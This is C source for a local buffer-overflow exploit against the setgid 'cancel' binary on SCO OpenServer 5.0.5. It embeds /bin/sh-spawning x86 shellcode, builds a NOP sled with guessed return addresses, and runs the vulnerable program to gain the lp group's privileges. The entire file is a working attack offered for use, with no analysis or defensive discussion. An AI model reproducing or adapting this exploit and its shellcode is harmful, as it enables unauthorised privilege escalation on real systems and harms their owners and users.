/**
 ** sco_cancel.c yields egid=18(lp)
 ** Tested on SCO 5.0.5+Skunkware98
 ** 
 ** Compile gcc -o sco_cancelx.c sco_cancelx.c 
 **
 ** Brock Tellier btellier@usa.net
 **	  
 **/ 


#include <stdlib.h>
#include <stdio.h>

char scoshell[]= /* doble@iname.com */
"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
"\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";

                       
#define LEN 1500
#define NOP 0x90
                       
unsigned long get_sp(void) {

__asm__("movl %esp, %eax");

}


int main(int argc, char *argv[]) {

long int offset=0;

int i;
int buflen = LEN;
long int addr;
char buf[LEN];
 
 if(argc > 3) {
  fprintf(stderr, "Error: Usage: %s offset buffer\n", argv[0]);
	exit(0); 
 }
 else if (argc == 2){
   offset=atoi(argv[1]);
   
 }
 else if (argc == 3) {
  offset=atoi(argv[1]);
  buflen=atoi(argv[2]); 
   
 }
 else {
   offset=600;
   buflen=1200;

 }
 

addr=get_sp();

fprintf(stderr, "\nSCO 5.0.5 cancel exploit yields egid=18(lp)\n");
fprintf(stderr, "Brock Tellier btellier@webley.com\n\n");
fprintf(stderr, "Using addr: 0x%x\n", addr+offset);

memset(buf,NOP,buflen);
memcpy(buf+(buflen/2),scoshell,strlen(scoshell));
for(i=((buflen/2) + strlen(scoshell))+1;i<buflen-4;i+=4)
	*(int *)&buf[i]=addr+offset;

execl("/opt/K/SCO/Unix/5.0.5Eb/.softmgmt/var/usr/bin/cancel", "cancel", buf,
NULL);

exit(0);
}

